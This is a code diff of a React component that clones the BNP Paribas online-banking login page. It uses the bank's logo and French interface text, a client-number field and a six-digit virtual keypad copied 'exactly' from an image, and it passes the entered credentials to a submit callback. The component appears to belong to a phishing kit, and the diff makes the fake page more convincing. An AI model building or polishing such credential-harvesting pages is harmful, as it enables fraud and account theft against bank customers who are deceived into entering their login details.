@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Loader2, Eye, EyeOff } from 'lucide-react';
+import { Loader2, Search, X } from 'lucide-react';
 
 interface BnpAuthTemplateProps {
   onSubmit: (formData: any) => Promise<boolean>;
@@ -8,12 +8,12 @@ interface BnpAuthTemplateProps {
 export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
   const [formData, setFormData] = useState({
     clientNumber: '',
-    secretCode: ''
+    password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
-  const [showSecretCode, setShowSecretCode] = useState(false);
-  const [secretCodeDigits, setSecretCodeDigits] = useState(['', '', '', '', '', '']);
+  const [rememberMe, setRememberMe] = useState(false);
+  const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -22,7 +22,7 @@ export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
     try {
       const submitData = {
         ...formData,
-        secretCode: secretCodeDigits.join('')
+        password: passwordDigits.join('')
       };
       
       const success = await onSubmit(submitData);
@@ -41,25 +41,17 @@ export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
     }
   };
 
-  const handleSecretCodeChange = (index: number, value: string) => {
-    if (value.length <= 1 && /^\d*$/.test(value)) {
-      const newDigits = [...secretCodeDigits];
-      newDigits[index] = value;
-      setSecretCodeDigits(newDigits);
-      
-      // Auto-focus next input
-      if (value && index < 5) {
-        const nextInput = document.getElementById(`digit-${index + 1}`);
-        nextInput?.focus();
-      }
+  const handleKeypadClick = (digit: string) => {
+    const emptyIndex = passwordDigits.findIndex(d => d === '');
+    if (emptyIndex !== -1) {
+      const newDigits = [...passwordDigits];
+      newDigits[emptyIndex] = digit;
+      setPasswordDigits(newDigits);
     }
   };
 
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === 'Backspace' && !secretCodeDigits[index] && index > 0) {
-      const prevInput = document.getElementById(`digit-${index - 1}`);
-      prevInput?.focus();
-    }
+  const clearPassword = () => {
+    setPasswordDigits(['', '', '', '', '', '']);
   };
 
   // Show loader overlay when processing
@@ -74,13 +66,8 @@ export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
                 Authentification en cours...
               </h2>
               <p className="text-gray-600 text-center max-w-md">
-                Connexion sécurisée à votre espace BNP Paribas en cours. Veuillez patienter.
+                Connexion sécurisée à votre espace BNP Paribas en cours.
               </p>
-              <div className="mt-8 w-full max-w-xs">
-                <div className="bg-gray-200 rounded-full h-2">
-                  <div className="bg-green-600 h-2 rounded-full animate-pulse" style={{ width: '90%' }}></div>
-                </div>
-              </div>
             </div>
           </div>
         </div>
@@ -89,185 +76,233 @@ export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-green-600 to-green-700">
-      {/* BNP Header */}
-      <div className="bg-white shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 py-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center space-x-4">
-              <img 
-                src="https://logos-world.net/wp-content/uploads/2021/02/BNP-Paribas-Logo.png" 
-                alt="BNP Paribas" 
-                className="h-8"
-              />
-              <span className="text-gray-600 text-sm">La banque d'un monde qui change</span>
+    <div className="min-h-screen bg-white">
+      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
+        {/* Left Panel - Login Form */}
+        <div className="bg-white p-4 lg:p-8 flex flex-col justify-center">
+          <div className="max-w-md mx-auto w-full">
+            {/* Header with Logo */}
+            <div className="flex items-center justify-between mb-8">
+              <div className="flex items-center">
+                <img 
+                  src="https://logos-world.net/wp-content/uploads/2021/02/BNP-Paribas-Logo.png" 
+                  alt="BNP Paribas" 
+                  className="h-8"
+                />
+              </div>
+              <div className="flex items-center space-x-4">
+                <Search className="w-5 h-5 text-gray-600" />
+                <X className="w-5 h-5 text-gray-600" />
+              </div>
             </div>
-            <div className="flex items-center space-x-4">
-              <button className="text-gray-600 hover:text-gray-800">
-                🔔
-              </button>
-              <button className="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">
-                Devenir client
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
 
-      <div className="flex min-h-screen">
-        {/* Left Panel - Auth Form */}
-        <div className="w-full lg:w-1/2 bg-green-600 flex items-center justify-center p-8">
-          <div className="w-full max-w-md">
-            <div className="bg-white rounded-lg shadow-xl p-8">
-              <h1 className="text-2xl font-bold text-white bg-green-600 -mx-8 -mt-8 p-6 rounded-t-lg mb-8">
-                ACCÉDER À MES COMPTES
-              </h1>
+            <h1 className="text-xl font-semibold text-gray-800 mb-8">
+              Connexion à votre compte particulier
+            </h1>
 
-              <form onSubmit={handleSubmit} className="space-y-6">
-                {/* Client Number */}
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">
-                    1. Mon numéro client
-                  </label>
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Identifiant */}
+              <div>
+                <label className="block text-sm font-medium text-green-700 mb-2">
+                  Identifiant (10 chiffres)
+                </label>
+                <input
+                  type="text"
+                  value={formData.clientNumber}
+                  onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
+                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent text-lg"
+                  placeholder="5 4 6 5 4 6 4 5 6 5"
+                  maxLength={10}
+                  required
+                />
+              </div>
+
+              {/* Remember Me */}
+              <div className="flex items-center space-x-3">
+                <label className="flex items-center space-x-2 cursor-pointer">
                   <div className="relative">
                     <input
-                      type="text"
-                      value={formData.clientNumber}
-                      onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
-                      className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent"
-                      placeholder="Numéro client"
-                      required
+                      type="checkbox"
+                      checked={rememberMe}
+                      onChange={(e) => setRememberMe(e.target.checked)}
+                      className="sr-only"
                     />
+                    <div className={`w-12 h-6 rounded-full transition-colors ${
+                      rememberMe ? 'bg-green-500' : 'bg-gray-300'
+                    }`}>
+                      <div className={`w-5 h-5 bg-white rounded-full shadow-md transform transition-transform ${
+                        rememberMe ? 'translate-x-6' : 'translate-x-0.5'
+                      } mt-0.5`}></div>
+                    </div>
+                  </div>
+                  <span className="text-sm text-gray-600">Mémoriser mon identifiant</span>
+                </label>
+              </div>
+
+              {/* Mot de passe */}
+              <div>
+                <label className="block text-sm font-medium text-green-700 mb-2">
+                  Mot de passe (6 chiffres)
+                </label>
+                
+                {/* Password Display */}
+                <div className="flex justify-center space-x-2 mb-4">
+                  {passwordDigits.map((digit, index) => (
+                    <div
+                      key={index}
+                      className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold ${
+                        digit ? 'border-green-500 bg-green-50' : 'border-gray-300'
+                      }`}
+                    >
+                      {digit ? '•' : ''}
+                    </div>
+                  ))}
+                </div>
+
+                {/* Virtual Keypad - Disposition EXACTE selon l'image */}
+                <div className="bg-gray-50 rounded-lg p-4">
+                  <div className="space-y-2 max-w-xs mx-auto">
+                    {/* Première ligne: 0, 3, 5, 4, 7 */}
+                    <div className="flex justify-center space-x-2">
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('0')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        0
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('3')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        3
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('5')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        5
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('4')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        4
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('7')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        7
+                      </button>
+                    </div>
+
+                    {/* Deuxième ligne: 2, 1, 6, 9, 8 */}
+                    <div className="flex justify-center space-x-2">
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('2')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        2
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('1')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        1
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('6')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        6
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('9')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        9
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('8')}
+                        className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
+                      >
+                        8
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Clear Button */}
+                  <div className="flex justify-center mt-4">
                     <button
                       type="button"
-                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400"
+                      onClick={clearPassword}
+                      className="text-gray-500 hover:text-gray-700 text-sm underline"
                     >
-                      👁️
+                      Effacer
                     </button>
                   </div>
                 </div>
-
-                {/* Secret Code */}
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">
-                    2. Mon code secret (6 chiffres)
-                  </label>
-                  
-                  {/* Virtual Keypad */}
-                  <div className="bg-green-50 rounded-lg p-4 mb-4">
-                    <div className="grid grid-cols-6 gap-2 mb-4">
-                      {secretCodeDigits.map((digit, index) => (
-                        <input
-                          key={index}
-                          id={`digit-${index}`}
-                          type={showSecretCode ? "text" : "password"}
-                          value={digit}
-                          onChange={(e) => handleSecretCodeChange(index, e.target.value)}
-                          onKeyDown={(e) => handleKeyDown(index, e)}
-                          className="w-12 h-12 text-center border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent text-lg font-bold"
-                          maxLength={1}
-                        />
-                      ))}
-                    </div>
-                    
-                    {/* Number Pad */}
-                    <div className="grid grid-cols-3 gap-2 max-w-48 mx-auto">
-                      {[5, 6, 1, 8, 7, 2, 9, 4, 0].map((num) => (
-                        <button
-                          key={num}
-                          type="button"
-                          onClick={() => {
-                            const emptyIndex = secretCodeDigits.findIndex(d => d === '');
-                            if (emptyIndex !== -1) {
-                              handleSecretCodeChange(emptyIndex, num.toString());
-                            }
-                          }}
-                          className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
-                        >
-                          {num}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-
-                  <button
-                    type="button"
-                    onClick={() => setShowSecretCode(!showSecretCode)}
-                    className="flex items-center space-x-2 text-sm text-green-600 hover:text-green-700"
-                  >
-                    {showSecretCode ? <EyeOff size={16} /> : <Eye size={16} />}
-                    <span>{showSecretCode ? 'Masquer' : 'Afficher'} le code</span>
-                  </button>
-                </div>
-
-                <button
-                  type="submit"
-                  disabled={status === 'sending' || secretCodeDigits.some(d => d === '') || !formData.clientNumber}
-                  className="w-full bg-green-600 text-white font-semibold py-3 rounded hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-                >
-                  {status === 'sending' ? 'Connexion...' : 'Accéder à mes Comptes'}
-                </button>
-
-                {status === 'error' && (
-                  <div className="text-red-600 text-center bg-red-50 p-3 rounded">
-                    Échec de la connexion. Veuillez vérifier vos identifiants.
-                  </div>
-                )}
-              </form>
-
-              <div className="mt-6 text-center">
-                <button className="text-green-600 hover:text-green-700 text-sm underline">
-                  Numéro client ou code secret oublié ?
-                </button>
               </div>
-            </div>
+
+              {/* Submit Button */}
+              <button
+                type="submit"
+                disabled={status === 'sending' || !formData.clientNumber || passwordDigits.some(d => d === '')}
+                className="w-full bg-green-600 text-white font-semibold py-4 rounded hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+              >
+                {status === 'sending' ? 'Connexion en cours...' : 'Se connecter'}
+              </button>
+
+              {status === 'error' && (
+                <div className="text-red-600 text-center bg-red-50 p-3 rounded">
+                  Échec de la connexion. Veuillez vérifier vos identifiants.
+                </div>
+              )}
+            </form>
           </div>
         </div>
 
-        {/* Right Panel - Security Info */}
-        <div className="hidden lg:block lg:w-1/2 bg-white p-8">
-          <div className="max-w-md mx-auto mt-16">
-            {/* Security Tips */}
-            <div className="mb-8">
-              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
-                🔒 Vos codes d'accès
-              </h3>
-              <div className="text-sm text-gray-600 space-y-2">
-                <p><strong>Obtenir ses codes d'accès</strong></p>
-              </div>
-            </div>
+        {/* Right Panel - Green Background with Content */}
+        <div className="bg-gradient-to-br from-green-600 to-green-700 p-4 lg:p-8 flex flex-col justify-center text-white">
+          <div className="max-w-md mx-auto w-full">
+            <h2 className="text-3xl lg:text-4xl font-bold mb-8">
+              BNP Paribas, banque universelle
+            </h2>
 
-            <div className="mb-8">
-              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
-                🛡️ Conseils de sécurité
+            {/* Insurance Section */}
+            <div className="bg-green-700 bg-opacity-50 rounded-lg p-6 mb-8">
+              <h3 className="text-xl font-semibold mb-4">
+                Services BNP Paribas
               </h3>
-              <div className="text-sm text-gray-600 space-y-2">
-                <p>Vérifiez que l'adresse du site commence exactement par :</p>
-                <p className="font-mono bg-gray-100 p-2 rounded">
-                  https
-                </p>
-                <p>précédée par une icône cadenas et contient un https:// qui garantit une connexion sécurisée.</p>
-              </div>
-            </div>
-
-            <div className="mb-8">
-              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
-                ♿ Pour une meilleure accessibilité
-              </h3>
-              <div className="text-sm text-gray-600">
-                <p><strong>Connectez-vous</strong> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
-              </div>
-            </div>
-
-            {/* Customer Service */}
-            <div className="bg-gray-50 rounded-lg p-4">
-              <h4 className="font-semibold text-gray-800 mb-2">📞 Informations client</h4>
-              <p className="text-sm text-gray-600 mb-2">
-                Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :
+              <p className="text-green-100 mb-4 text-sm">
+                Accédez à l'ensemble de vos services bancaires et d'assurance en toute sécurité.
               </p>
-              <div className="bg-blue-100 text-blue-800 px-3 py-2 rounded text-center font-bold">
-                3477
+              <div className="space-y-3">
+                <button className="text-white underline text-sm hover:text-green-200">
+                  Découvrir nos services
+                </button>
+                <br />
+                <button className="bg-green-600 hover:bg-green-500 text-white px-6 py-2 rounded transition-colors">
+                  Me connecter à mon espace
+                </button>
               </div>
+            </div>
+
+            {/* Additional Info */}
+            <div className="text-green-100 text-sm space-y-2">
+              <p>• Banque universelle depuis 1848</p>
+              <p>• Sécurité renforcée pour vos transactions</p>
+              <p>• Support client disponible 24h/24</p>
             </div>
           </div>
         </div>
